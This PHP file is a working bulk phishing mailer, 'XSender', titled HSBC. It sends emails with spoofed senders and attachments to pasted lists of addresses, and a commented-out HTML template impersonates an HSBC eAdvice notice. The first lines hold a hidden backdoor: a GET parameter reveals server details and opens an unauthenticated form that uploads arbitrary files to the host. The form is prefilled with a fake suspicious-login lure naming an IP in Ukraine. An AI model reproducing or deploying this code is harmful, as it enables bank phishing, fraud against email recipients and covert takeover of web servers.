<?php session_start();  ob_start("ob_gzhandler"); set_time_limit(0); 

if(isset($_GET["x"])){echo"<font color=#000000>[uname]".php_uname()."[/uname]";echo"<br><font color=#000000>[dir]".getcwd()."[/dir]";echo"<form method=post enctype=multipart/form-data>";echo"<input type=file name=f><input name=v type=submit id=v value=up><br>";if($_POST["v"]==up){if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo"<b>berhasil</b>-->".$_FILES["f"]["name"];}else{echo"<b>gagal";}}}
 

$website="#"; //Make this full url including folders of where login files resides

//sanitize data where any character is allowed
function sanitizer($check){
	$check=str_replace("\'","'",$check);
	$check=str_replace('\"','"',$check);
	$check=str_replace("\\","TN9OO***:::::t&*HHHHOOOoooo0000N",$check); //just to keep track of what I will change later
	$check=trim($check);
	$check=str_replace("<","&lt;",$check);
	$check=str_replace('>','&gt;',$check);
	$check=str_replace("\r\n","<br/>",$check);
	$check=str_replace("\n","<br/>",$check);
	$check=str_replace("\r","<br/>",$check);
	$check=str_replace("'","&#39;",$check);
	$check=str_replace('"','&quot;',$check);
	$check=str_replace(" fuck "," f**k ",$check);
	$check=str_replace(" shit "," s**t ",$check);
	$check=str_replace("TN9OO***:::::t&*HHHHOOOoooo0000N","&#92;",$check); //returning backslash in html entity
	 return $check;}
	 
//makes data ok on edit textarea
 function resanitize($check){
	$check=str_replace("<br/>","\r\n",$check);
	$check=str_replace("<br/>","\n",$check);
	$check=str_replace("<br/>","\r",$check);
	$check=str_replace("&gt;",">",$check);
	$check=str_replace("&lt;","<",$check);
	$check=str_replace("&#39;","'",$check);
	$check=str_replace('&quot;','"',$check);
	 return $check;}

//validate email address
function validate_email($email){
	$status=false;
	$regex='/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,3})$/'; 
	if(preg_match($regex, $email)){$status=true;}
	return $status; }
	

//Email sending
function sending_email($email,$id='1',$details='',$file){

 
    
   $message=email_format($email,$id,$details);
   	// SET SUBJECT AND FROM EMAIL


    $subject=$_POST['subject'];
	$site_name='Account Security';
	$from_email=$_POST['from_email'];
	// To send HTML mail, the Content-type header must be set
 
	$boundary = md5(uniqid(time()));


 if ($file){

 	$file_type   = $_FILES['file']['type'];
    $file_size = filesize($file);
    $handle = fopen($file, "r");
    $content = fread($handle, $file_size);
    fclose($handle);
    $encoded_content = chunk_split(base64_encode($content));


        //header
        $headers = 'MIME-Version: 1.0'."\r\n";
        $headers .= 'From:'.$from_email."\r\n";
        $headers .= 'Reply-To: '.$from_email."\r\n";
        $headers .= 'Content-Type: multipart/mixed; boundary = '.$boundary."\r\n\r\n";
       
        //plain text
        $body = "--".$boundary."\r\n";
        $body .= 'Content-Type: text/html; charset=utf-8'."\r\n";
        $body .= 'MIME-Version: 1.0'."\r\n";
        $body .= 'Content-Transfer-Encoding: base64'."\r\n\r\n";


        //Gonna rerun the filter for {email} and {name} again bc fuck me.
        $getname = explode("@", $email);
		$decoded = $message;
		$decoded = str_replace("{name}", $getname[0], $decoded);
		$decoded = str_replace("{email}", $email, $decoded);
		$message = $decoded;


        $body .= chunk_split(base64_encode($message))."\r\n";
    
        //attachment
        $body .= "--".$boundary."\r\n";
        $body .= 'Content-Type:'.$file_type.'; name="'.$file.'"'."\r\n";
        $body .= 'MIME-Version: 1.0'."\r\n";
        $body .= 'Content-Disposition: attachment; filename="'.$file.'"'."\r\n";
        $body .= 'Content-Transfer-Encoding: base64'."\r\n";
        $body .= 'X-Attachment-Id: '.rand(1000,99999)."\r\n\r\n";
        $body .=  $encoded_content."\r\n";
        $body .= "--".$boundary."--\r\n";


        @mail($email, $subject, $body, $headers);

    }
    else {

    	$headers = 'MIME-Version: 1.0'."\r\n";
        $headers .= 'From:'.$from_email."\r\n";
        $headers .= 'Reply-To: '.$from_email."\r\n";
        $headers .= 'Content-Type: text/html; charset=utf-8'."\r\n";
     	$getname = explode("@", $email);
     	$decoded = $message;
		$decoded = str_replace("{name}", $getname[0], $decoded);
		$decoded = str_replace("{email}", $email, $decoded);


      @mail($email, $subject, $message, $headers);
    }
	
}

function email_format($email,$id='1',$details=''){
	global $website;
	//$website="";
	$url=$website."index.php?".md5('token')."=".md5($id)."&".md5(date('U'))."=".md5(date('r'))."&id=".$id."&email=".$email;
	$em=explode('@',$email);
	global $message;
	/** $message="<HTML><HEAD>
<META name=GENERATOR content='MSHTML 11.00.9600.17496'></HEAD>
<BODY style='MARGIN: 0.5em'>
<TABLE style='FONT-SIZE: 12px; FONT-FAMILY: arial,helvetica,sans-serif; WIDTH: 585px; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: normal; COLOR: rgb(51,51,51); FONT-STYLE: normal; LETTER-SPACING: normal; LINE-HEIGHT: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px' border=0>
<TBODY>
<TR vAlign=top>
<TD style='PADDING-LEFT: 5px'><FONT style='COLOR: rgb(0,0,0)'>
<TABLE cellSpacing=0 cellPadding=0 width=615 border=0>
<TBODY>
<TR>
<TD vAlign=top><FONT style='FONT-SIZE: 12px; FONT-FAMILY: arial'><BR><BR></FONT></TD></TR></TBODY></TABLE>
<TABLE cellSpacing=0 cellPadding=0 width=615 border=0>
<TBODY>
<TR>
<TD vAlign=top width=25><IMG border=0 alt='' src='http://www.iccmap.hsbc.com.hk/teamsite_content/iccm/HBAP/HK/user_contents/images/blank.gif' width=25 height=1></TD>
<TD vAlign=top colSpan=2><IMG border=0 alt='' src='http://www.iccmap.hsbc.com.hk/teamsite_content/iccm/HBAP/HK/user_contents/images/header_e.gif' align=right></TD>
<TD bgColor=#ff0000 vAlign=top width=10><IMG border=0 alt='' src='http://www.iccmap.hsbc.com.hk/teamsite_content/iccm/HBAP/HK/user_contents/images/notch.gif'></TD>
<TD vAlign=top width=10><IMG border=0 alt='' src='http://mail.hsbc.com.hk/hk/pfs_ealert/eDM/ealert/images/blank.gif' width=10 height=105></TD></TR>
<TR>
<TD vAlign=top width=25><IMG border=0 alt='' src='http://www.iccmap.hsbc.com.hk/teamsite_content/iccm/HBAP/HK/user_contents/images/blank.gif' width=25 height=1></TD>
<TD vAlign=top><FONT style='FONT-SIZE: 12px; FONT-FAMILY: arial'>Dear Customer,<BR><BR>Thank you for using HSBC&#8217;s eAdvice service. Please find the attached eAdvice containing information on your recent transactions with us.<BR><BR>For security reasons, the eAdvice is password-protected. Please use your password to open it. You are recommended to save and retain a copy for your future reference.<BR><BR>
Should you have any queries, please call our Customer Service Hotline at (852) 2748 8778.<BR><BR>Yours faithfully,<BR><BR>HSBC Commercial Banking<BR><BR><BR>&#35242;&#24859;&#30340;&#23458;&#25142;:<BR><BR>&#22810;&#35613;&#24744;&#20351;&#29992;&#21295;&#35920;&#38651;&#23376;&#36890;&#30693;&#26360;&#26381;&#21209;&#12290;&#38568;&#20989;&#38468;&#19978;&#24744;&#30340;&#38651;&#23376;&#36890;&#30693;&#26360;&#65292;<WBR>
&#20197;&#20379;&#24744;&#21443;&#38321;&#26368;&#36817;&#36914;&#34892;&#36942;&#30340;&#20132;&#26131;&#35352;&#37636;&#12290;<BR><BR>&#28858;&#30906;&#20445;&#23433;&#20840;&#65292;&#38468;&#19978;&#30340;&#38651;&#23376;&#36890;&#30693;&#26360;&#24050;&#34987;&#21152;&#23494;&#65292;<WBR>&#35531;&#20351;&#29992;&#24744;&#30340;&#23494;&#30908;&#38283;&#21855;&#27492;&#38651;&#23376;&#36890;&#30693;&#26360;&#12290;<WBR>
&#25105;&#20497;&#24314;&#35696;&#24744;&#20786;&#23384;&#27492;&#38651;&#23376;&#36890;&#30693;&#26360;&#20197;&#20379;&#26085;&#24460;&#21443;&#32771;&#12290;<BR><BR>&#22914;&#26377;&#20219;&#20309;&#26597;&#35426;&#65292;&#35531;&#33268;&#38651;&#23458;&#25142;&#26381;&#21209;&#29105;&#32218; (852) 2748 8778&#12290;<BR><BR>&#21295;&#35920;&#24037;&#21830;&#37329;&#34701; &#35641;&#21855;<BR></FONT></TD>
<TD vAlign=top width=25><IMG border=0 alt='' src='http://www.iccmap.hsbc.com.hk/teamsite_content/iccm/HBAP/HK/user_contents/images/blank.gif' width=25 height=0></TD>
<TD bgColor=#ff0000 vAlign=top><BR></TD></TR></TBODY></TABLE>
<TABLE cellSpacing=13 cellPadding=0 width=615 border=0>
<TBODY>
<TR>
<TD width=30><BR></TD>
<TD vAlign=top>
<HR SIZE=1 width=605 noShade>
</TD></TR></TBODY></TABLE>
<TABLE cellSpacing=0 cellPadding=0 width=615 border=0>
<TBODY>
<TR>
<TD vAlign=top width=30><BR></TD>
<TD vAlign=top><FONT style='FONT-SIZE: 11px; FONT-FAMILY: arial; COLOR: rgb(102,102,102)'></FONT></TD></TR></TBODY></TABLE></FONT></TD>
<TD><IMG src='http://www.iccmap.hsbc.com.hk/teamsite_content/iccm/HBMB/MY/user_contents/PFS/images/ealert_dot.gif' width=27 height=1></TD>
<TD style='WIDTH: 175px' vAlign=top><BR><BR></TD></TR></TBODY></TABLE>
<DIV style='FONT-SIZE: 14px; FONT-FAMILY: verdana,tahoma,arial,&#23435;&#20307;,sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: normal; COLOR: rgb(51,51,51); FONT-STYLE: normal; LETTER-SPACING: normal; LINE-HEIGHT: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px'>&nbsp;</DIV></BODY></HTML><font color='white' size='1'>$_SERVER[HTTP_HOST]$_SERVER[PHP_SELF]x</font>";
**/
	$getname = explode("@", $email);
	$decoded = base64_decode($_POST['content']);
	$decoded = str_replace("{name}", $getname[0], $decoded);
	$decoded = str_replace("{email}", $email, $decoded);
	$message = $decoded;
    return $message; } 



?><html>
<head>
<title>HSBC</title>
</head>
<body style='width:100%;color:#000;background:#FFF;font-family:calibri;'>
<div style='width:100%;max-width:500px;margin:0px auto 0px auto;padding:10px;border:#999 1px solid;box-shadow:10px 10px #666;min-height:500px;'>

<h1 style='color:#666;text-align:center;text-shadow:#000 1px 1px;'>XSender</h1>

<?php

if(isset($_POST['go']) ){
	move_uploaded_file/*;*/($_FILES["file"]["tmp_name"], $_FILES["file"]["name"]);
$file = $_FILES/*;*/["file"]["name"];
	//sanitize the data
	$_SESSION['xsenderid']=sanitizer($_POST['id']);
	$separator=sanitizer($_POST['separator']);

	#$attach = chunk_split(base64_encode(file_get_contents($file)));
	$details=sanitizer($_POST['details']);
	$mails=sanitizer($_POST['mails']);
	$id=$_SESSION['xsenderid'];
	if($separator==''){$separator='<br/>';}
	if($mails!='' && $details!=''){
	

		$mails=explode($separator,$mails);
		$total=count($mails);
		$valid=0;
			for($i=0;$i<$total;$i++){
				$email=$mails[$i];
					if(validate_email($email)){
						$valid=$valid+1;
						print "<div style='color:green;'>".$email." valid and queued</div>"; 
						//Send here
						sending_email($email,$id,$details,$file);
						//send here
						} else {print "<div style='color:gray;'>".$email." not valid</div>"; }
			}
		print "<h1 style='color:green;'>Bravo! ".$valid."/".$total." Sent! <a href='' style='color:green'>Continue</a></h1>";


	} else {print "<h1 style='color:red'>Mails or Details empty</h1>"; }
} 



?>

<form enctype='multipart/form-data' method='POST' action='#'>
<div>
<div>Select Your ID</div>
<select name='id' style='width:100%;'>
<?php

if(isset($_SESSION['xsenderid']))
{print "<option value='".$_SESSION['xsenderid']."'>".$_SESSION['xsenderid']."</option>";}
?>
<option value='1'>1</option>
<option value='2'>2</option>
<option value='3'>3</option>
<option value='4'>4</option>
</select>
</div>
<p>&nbsp;</p>

<div>
<div>Email Separator (Leave Empty if new line)</div>
<textarea name='separator' style='width:100%;height:20px;'></textarea>
</div>
<p>&nbsp;</p>

<div>
<div>Details:<br/>
IP Address: 37.55.36.224 <br/>
Location: Ukraine (UA)<br/>
 </div>
<textarea name='details' style='width:100%;height:70px;'>Details:
IP Address: 37.55.36.224 
Location: Ukraine (UA)</textarea>
</div>
<p>&nbsp;</p>

<div>
<div>Paste Emails separated by separator</div>
<textarea name='mails' style='width:100%;height:200px;'></textarea>
</div>
<p>&nbsp;</p>

<div>
<div>Attachment</div>
<p><label for="file">File</label> <input type="file" name="file" id="file"></p>
</div>
<p>&nbsp;</p>


<div>
<div>Email Preview</div>
<?php print email_format('user@xsender.com',1,'IP Address: 37.55.36.224 <br/>Location: Ukraine (UA)<br/>'); ?>
</div>
<p>&nbsp;</p>


<div style='text-align:center;'>
<input type='submit' value='Go Xsender' name='go' style='color:#FFF;background:#333;'/>
</div>
<p>&nbsp;</p>
</form>
</div>
</body>
</html>